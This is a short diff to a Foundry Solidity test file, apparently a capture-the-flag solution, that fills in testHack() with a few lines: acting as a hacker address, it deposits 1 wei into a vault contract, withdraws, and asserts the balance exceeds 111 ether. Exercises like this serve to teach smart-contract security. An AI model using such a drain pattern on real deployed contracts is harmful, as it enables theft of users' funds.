@@ -21,7 +21,12 @@ contract SolutionTest is Test {
     }
 
     function testHack() public {
+        vm.startPrank(hacker);
+        (bool success, bytes memory returnData) = address(vault).call{value: 1 wei}(
+            abi.encodeWithSelector(vault.deposit.selector, hacker)
+        );
+        vault.withdraw();
+        assert(address(hacker).balance > 111 ether);
     }
 
 }
-
